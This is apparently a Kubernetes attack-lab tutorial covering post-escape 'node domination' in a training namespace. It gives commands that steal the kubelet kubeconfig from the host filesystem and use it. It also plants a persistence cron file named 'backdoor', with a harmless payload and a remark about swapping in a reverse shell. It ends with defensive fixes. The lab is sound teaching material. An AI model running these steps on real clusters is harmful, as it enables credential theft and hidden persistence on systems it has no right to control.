# Episode 4 – Node Domination

In Episode 3, we escaped the container and gained root access to the Node. Now, we ask: **"What can I do with this power?"**

In this episode, we assume:
> You have achieved **Code Execution on the Node** (via Container Escape, SSH, or RCE).
> You are `root` on the worker node.

Our goal here is to:
- **Steal the Kubelet's Credentials**: Access the `kubeconfig` used by the Kubelet service.
- **Control the Node**: Use these credentials to talk to the API as the Node.
- **Establish Persistence**: Create a cron job on the host to ensure we stay in control even if the pod is deleted.

## 1. Setup the Lab

We deploy a pod that simulates our "foothold" on the node (Privileged + HostPath mounted).

From the root of this repo:

```bash
kubectl apply -f episodes/ep4-node-domination/manifests/
```

## 2. Enter the Attacker Pod

```bash
kubectl -n battleground exec -it deploy/node-attacker -- bash
```

## 3. The Attack: Looting the Node

Since we mounted the host's root filesystem at `/host`, we don't even need `nsenter` to read files. We can just browse `/host/...`.

### 3.1. Stealing Kubelet Credentials

The Kubelet needs to talk to the API Server. It usually keeps its `kubeconfig` in `/etc/kubernetes/`.

```bash
ls -l /host/etc/kubernetes/
```

You should see `kubelet.conf` or similar. Let's try to use it!

```bash
# Point kubectl to the stolen config
export KUBECONFIG=/host/etc/kubernetes/kubelet.conf

# Where is kubectl?
# If it's not in the pod, we can use the one ON THE HOST via chroot!
chroot /host kubectl get nodes
```

**Impact:**
The Kubelet's credentials allow it to:
- Read all Secret/ConfigMap objects mounted to pods on this node.
- Update its own Node status.
- (In some misconfigured clusters) Read all secrets in the cluster.

### 3.2. Persistence via Cron

We want to make sure that even if this pod is deleted, we still have code execution on the node. We can add a malicious cron job to the **Host's** `/etc/cron.d/`.

```bash
# Create a reverse shell payload (simulated)
echo "* * * * * root echo 'I OWN THIS NODE' > /tmp/pwned.txt" > /host/etc/cron.d/backdoor

# Verify it exists
cat /host/etc/cron.d/backdoor
```

Now, every minute, the **Host OS** will execute our command. In a real scenario, this would be a reverse shell connecting back to our C2 server.

### 3.3. Check the Persistence

Wait a minute, then check if the file was created on the host:

```bash
cat /host/tmp/pwned.txt
```

## 4. Fix

- **Restrict HostPath:** Use Policy (PSS/OPA) to block `hostPath` mounts, especially for `/`, `/etc`, and `/var`.
- **Rotate Credentials:** If a node is compromised, rotate the Kubelet certificates immediately.
- **Node Isolation:** Ensure Kubelet credentials only have permissions for *that specific node* (NodeAuthorizer).
- **File Integrity Monitoring (FIM):** Monitor `/etc/kubernetes` and `/etc/cron.d` for unauthorized changes.
